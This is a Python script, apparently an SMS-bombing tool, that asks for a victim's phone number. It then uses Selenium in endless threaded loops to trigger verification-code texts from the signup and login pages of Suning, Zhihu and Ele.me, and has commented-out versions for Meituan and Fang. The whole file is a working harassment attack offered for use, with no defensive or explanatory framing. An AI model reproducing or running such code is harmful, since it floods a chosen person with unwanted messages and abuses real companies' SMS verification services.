import requests
from threading import Thread
from selenium import webdriver
import time

class HongZha():
    def __init__(self,phone):
        self.phone = phone
        self.num = 0
    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{}   第{}次  发送成功   {}".format(self.phone,self.num,name))
    def sn(self,name):
        while True:
            driver = webdriver.Chrome()
            driver.get("https://reg.suning.com/person.do")
            # click1 = driver.find_element_by_class_name('active')
            # click1.click()
            # # time.sleep(1)
            #driver.switch_to.frame(driver.find_element_by_xpath('//iframe'))
            input = driver.find_element_by_xpath('//input[@type="text"]')
            input.send_keys(self.phone)
            time.sleep(1)
            button = driver.find_element_by_xpath('//a[@id="sendSmsCode"]')
            self.send_yzm(button,name)
            driver.quit()
        # button = driver.find_element_by_class_name('phone__timer btn btn_grey btn_m')
        # button.click()
    def zh(self,name):
        while True:
            driver = webdriver.Chrome()
            driver.get("https://www.zhihu.com/signup?next=%2F")
            input = driver.find_element_by_xpath('//input[@type="tel"]')
            input.send_keys(self.phone)
            time.sleep(2)
            button = driver.find_element_by_xpath('//button[@class="Button CountingDownButton SignFlow-smsInputButton Button--plain"]')
            self.send_yzm(button, name)
            driver.quit()
    # def my(self):
    #     driver = webdriver.Chrome()
    #     driver.get("https://passport.meituan.com/account/unitivesignup")
    #     time.sleep(3)
    #     input = driver.find_element_by_xpath('//input[@name="mobile"]')
    #     input.send_keys(self.phone)
    #     time.sleep(3)
    #     button = driver.find_element_by_xpath('//div[@class="verify-wrapper"]/input')
    #     time.sleep(2)
    #     button.click()
    # def fang(self):
    #     driver = webdriver.Chrome()
    #     driver.get("https://passport.fang.com/register.aspx")
    #     input = driver.find_element_by_xpath('//input[@type="text"]')
    #     input.send_keys(self.phone)
    #     time.sleep(3)
    #     button = driver.find_element_by_xpath('//input[@type="button"]')
    #     time.sleep(2)
    #     button.click()
    def ele(self,name):
        while True:
            driver = webdriver.Chrome()
            driver.get("https://h5.ele.me/login/#redirect=https%3A%2F%2Fwww.ele.me%2Fhome%2F")
            input = driver.find_element_by_xpath('//input[@type="tel"]')
            input.send_keys(self.phone)
            time.sleep(2)
            button = driver.find_element_by_xpath('//button[@class="CountButton-3e-kd"]')
            self.send_yzm(button, name)
            driver.quit()

if __name__ == "__main__":
    phone = int(input("请输入要轰炸的手机号:"))
    demo = HongZha(phone)
    zh = Thread(target=demo.zh,args=("zh",))
    sn = Thread(target=demo.sn,args=("sn",))
    ele = Thread(target=demo.ele,args=("ele",))


    zh.start()
    sn.start()
    ele.start()